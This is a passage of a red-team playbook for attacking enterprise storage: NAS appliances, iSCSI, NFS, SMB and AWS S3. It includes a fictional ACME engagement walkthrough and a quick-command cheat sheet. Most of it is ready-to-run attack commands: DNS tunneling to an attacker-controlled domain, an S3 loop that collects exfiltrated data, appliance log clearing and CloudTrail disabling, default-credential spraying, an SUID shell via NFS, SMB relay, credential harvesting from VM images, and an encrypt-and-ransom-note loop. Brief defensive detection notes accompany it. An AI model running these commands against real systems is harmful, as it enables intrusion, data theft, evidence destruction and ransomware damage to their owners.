# (use iodine or dnscat2 against a controlled domain)
iodine -f -P REPLACE_WITH_YOUR_PASSWORD tunnel.attacker.com

# On attacker side: poll S3 bucket for chunked data
while true; do
  aws s3 ls s3://REPLACE_WITH_BUCKET_NAME --recursive --profile REPLACE_WITH_YOUR_PROFILE | \
    awk '{print $4}' | while read key; do
      aws s3 cp "s3://REPLACE_WITH_BUCKET_NAME/${key}" /tmp/chunk --profile REPLACE_WITH_YOUR_PROFILE
      cat /tmp/chunk
      aws s3 rm "s3://REPLACE_WITH_BUCKET_NAME/${key}" --profile REPLACE_WITH_YOUR_PROFILE
    done
  sleep 5
done
```

### 20.3 Defensive Detection — DLP Bypass

- DLP solutions that scan SMB / S3 traffic flag known file types (PE, ELF, source code)
- Steganography defeats signature-based DLP; requires content-disposition scanning (entropy analysis)
- DNS tunneling requires DNS query rate/length anomaly detection (e.g., Suricata rule for high-entropy TXT queries)

---

## 21. Anti-Forensic Techniques on Storage

> Use ONLY with engagement authorization for anti-forensic testing. These techniques apply to red teams testing detection gaps.

### 21.1 Clearing Appliance Audit Logs

```bash
# NetApp: clear audit log (requires security admin)
ssh admin@netapp 'security audit log clear -vserver svm1'

# Synology DSM: clear syslog (requires root via SSH)
ssh admin@synology 'sudo truncate -s 0 /var/log/synolog/synosec.log'

# QNAP QTS: clear web server logs (requires admin via web shell)
ssh admin@qnap 'truncate -s 0 /var/log/apache2/access_log'
```

### 21.2 Tampering with CloudTrail

```bash
# Disable CloudTrail logging (if attacker has cloudtrail:UpdateTrail)
aws cloudtrail update-trail --name REPLACE_WITH_TRAIL_NAME --no-include-global-service-events
aws cloudtrail stop-logging --name REPLACE_WITH_TRAIL_NAME

# Delete CloudTrail logs (requires s3:DeleteObject on the log bucket)
aws s3 rm s3://REPLACE_WITH_LOG_BUCKET/AWSLogs/REPLACE_WITH_ACCOUNT_ID/CloudTrail/ --recursive

# CloudTrail file integrity validation detects this; attacker should also delete .hash files (fails integrity check)
```

### 21.3 Defensive Detection — Anti-Forensics

- Forward all appliance logs to an external syslog server (not just local log)
- Enable CloudTrail log file validation
- Enable AWS CloudWatch Logs insights with alert on `StopLogging` / `DeleteTrail` events
- Implement SIEM correlation rules for "log clearing" events across storage estate

---

## 22. Sample Engagement Walkthrough

This is a worked example for a hypothetical engagement against a fictional ACME Corp.

### 22.1 Scope

- ACME Corp storage estate: 1 NetApp FAS, 1 Dell EMC Unity, 2 QNAP NAS, AWS account with ~50 S3 buckets
- Read-only default; explicit auth for one ransomware simulation on a test bucket
- Storage VLAN: 10.0.0.0/24

### 22.2 Recon Findings

```bash
# Sweep
nmap -sV -p 3260,2049,445,161,10000,9000,8080,5000,5001 10.0.0.0/24 -oA recon/storage_sweep

# Per-host
10.0.0.5: open 443, 3260, 2049, 445, 161, 22 — NetApp FAS2750 (banner)
10.0.0.6: open 443, 3260, 2049, 445 — Dell EMC Unity 380
10.0.0.10: open 8080, 445, 2049, 22 — QNAP TS-870
10.0.0.11: open 5000, 5001, 445, 2049 — Synology RS3618xs
```

### 22.3 Exploitation (Hypothetical Findings)

| Finding | Host | Severity | Remediation |
|---------|------|----------|-------------|
| NetApp admin/login:REPLACE_WITH_YOUR_PASSWORD (weak) | 10.0.0.5 | CRITICAL | Rotate admin password; enforce 16+ char |
| iSCSI unauth login on target iqn.2001-04.com.acme:sn0 | 10.0.0.5 | CRITICAL | Enable CHAP mutual auth |
| NFS export `/exports/data` no_root_squash | 10.0.0.5 | CRITICAL | Set root_squash; use sec=krb5p |
| Dell EMC nasadmin/nasadmin default | 10.0.0.6 | CRITICAL | Disable nasadmin; rotate admin |
| QNAP admin/admin default | 10.0.0.10 | CRITICAL | Rotate admin; enable 2FA |
| Synology DSM 6.x (vuln to CVE-2022-27523) | 10.0.0.11 | HIGH | Upgrade to DSM 7+ |
| S3 bucket `acme-backups` public listable | AWS | CRITICAL | Enable Block Public Access |
| S3 bucket `acme-logs` contains AWS access keys in objects | AWS | CRITICAL | Rotate keys; scan with Macie |
| SNMP private RW community on NetApp | 10.0.0.5 | CRITICAL | Switch to SNMPv3 authPriv |
| NDMP daemon backup/backup on port 10000 | 10.0.0.5 | HIGH | Restrict to backup server IP; require MD5 auth |

### 22.4 Post-Exploitation

```bash
# Pivot from NetApp to backed-up VM images
ssh admin@netapp 'volume show -fields junction-path'
#   vol1: /vol/vol1 (NFS export, contains VM images)
mount -t nfs -o vers=3,nolock 10.0.0.5:/vol/vol1 /mnt/nfs

# Identify VM images
find /mnt/nfs -name '*.vmdk' -o -name '*.qcow2' -o -name '*.vhdx'

# Mount a VM image read-only and harvest credentials
guestmount --ro -a /mnt/nfs/vm1/vm1.vmdk -i --mount /dev/sda1 /mnt/vm
grep -rE 'AKIA[0-9A-Z]{16}|password|secret' /mnt/vm/etc/ /mnt/vm/var/ /mnt/vm/root/ 2>/dev/null | head -20
```

### 22.5 Ransomware Simulation (Authorized)

```bash
# Test bucket: acme-ransom-test (explicitly authorized for this test)
# Step 1: enumerate
aws s3api list-objects-v2 --bucket acme-ransom-test --profile REPLACE_WITH_PROFILE > keys.json

# Step 2: download + encrypt + re-upload (simulated)
jq -r '.Contents[].Key' keys.json | while read key; do
  aws s3 cp "s3://acme-ransom-test/${key}" /tmp/obj --profile REPLACE_WITH_PROFILE
  openssl enc -aes-256-cbc -in /tmp/obj -out /tmp/obj.enc -k REPLACE_WITH_YOUR_KEY
  aws s3 cp /tmp/obj.enc "s3://acme-ransom-test/${key}.enc" --profile REPLACE_WITH_PROFILE
done

# Step 3: drop ransom note
echo 'AUTHORIZED SIMULATION - ACME Corp pentest' > /tmp/RANSOM.txt
aws s3 cp /tmp/RANSOM.txt s3://acme-ransom-test/RANSOM.txt --profile REPLACE_WITH_PROFILE

# Step 4: test detection
aws logs filter-log-events --log-group-name CloudTrail/Insight \
  --filter-pattern '{ $.eventName = "PutObject" && $.requestParameters.bucketName = "acme-ransom-test" }' \
  --start-time $(date -d '1 hour ago' +%s)000 | jq '.events | length'

# Step 5: verify recovery (Object Lock + versioning)
aws s3api list-object-versions --bucket acme-ransom-test --prefix test.txt --profile REPLACE_WITH_PROFILE
aws s3api get-object --bucket acme-ransom-test --key test.txt --version-id REPLACE_WITH_VERSION_ID restored.txt --profile REPLACE_WITH_PROFILE

# Step 6: restore all objects after simulation
jq -r '.Contents[].Key' keys.json | while read key; do
  aws s3 rm "s3://acme-ransom-test/${key}.enc" --profile REPLACE_WITH_PROFILE
done
aws s3 rm s3://acme-ransom-test/RANSOM.txt --profile REPLACE_WITH_PROFILE
```

### 22.6 Reporting

Aggregate findings into a report following the structure in `guides/storage-san-attack-playbook.md` section 5.5. Include:

- Executive summary
- Methodology
- Findings table
- Per-finding detail (with command, output, severity, remediation)
- Ransomware simulation results
- Defensive recommendations (prioritized)
- Appendices (raw recon output, evidence inventory)

---

## 23. Cheat Sheet — Quick Commands

### 23.1 Discovery

```bash
nmap -sV -p 3260,2049,445,161,10000,9000,8080,5000,5001 10.0.0.0/24
showmount -e 10.0.0.5
iscsiadm -m discovery -t sendtargets -p 10.0.0.5
crackmapexec smb 10.0.0.0/24 -u '' -p '' --shares
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.2.1.1.1
curl -sI https://REPLACE_WITH_BUCKET_NAME.s3.amazonaws.com/
```

### 23.2 Default Credential Spray

```bash
# NetApp
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://10.0.0.5/api/cluster
# Dell EMC
/opt/Navisphere/bin/naviseccli -h 10.0.0.5 -user nasadmin -password nasadmin getagent
# QNAP
curl -k -X POST 'https://10.0.0.5:8080/cgi-bin/quick/quick.cgi' -d 'user=admin&password=admin&act=login'
# Synology
curl -k -X POST 'https://10.0.0.5:5001/webapi/auth.cgi' -d 'api=SYNO.API.Auth&version=3&method=login&account=admin&passwd=admin'
# Pure Storage
curl -k -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"pure"}' https://10.0.0.5/api/1.0/auth/apitoken
```

### 23.3 Exploitation

```bash
# iSCSI login
iscsiadm -m node -T <iqn> -p 10.0.0.5 -l
mount -o ro /dev/sdb1 /mnt/lun

# NFS no_root_squash
mount -t nfs -o vers=3,nolock 10.0.0.5:/data /mnt/nfs
cp /bin/bash /mnt/nfs/suid_shell && chmod 4777 /mnt/nfs/suid_shell

# SMB relay
sudo python3 /opt/impacket/examples/ntlmrelayx.py -t smb://10.0.0.5 -smb2support

# S3 anonymous download
aws s3 sync s3://REPLACE_WITH_BUCKET_NAME ./out --no-sign-request

# S3 secrets scan
trufflehog filesystem ./out
gitleaks detect --source ./out
```

### 23.4 Defense Verification

```bash
# S3 Block Public Access
aws s3control get-public-access-block --account-id REPLACE_WITH_YOUR_ACCOUNT_ID

# NetApp audit log
ssh admin@netapp 'security audit log show'

# AWS CloudTrail alerts
aws logs describe-alarms --alarm-name-prefix s3-
```

---

## Cross-References

- `SKILL.md` — Skill overview, differentiation, use cases, methodology
- `test-cases.md` — 12 structured test cases (TC-SN-001 through TC-SN-012)
- `guides/storage-san-attack-playbook.md` — Comprehensive playbook with vendor recon matrix, real-world incidents, lab setup, and defensive hardening
- `skills/database-attack/` — RDBMS/NoSQL direct attack (vs. this skill's storage fabric focus)
- `skills/cloud-security/` — Broader cloud posture (vs. this skill's storage-specific scope)
- `skills/ad-ldap-attack/` — Domain-joined appliance context (Kerberos delegation)
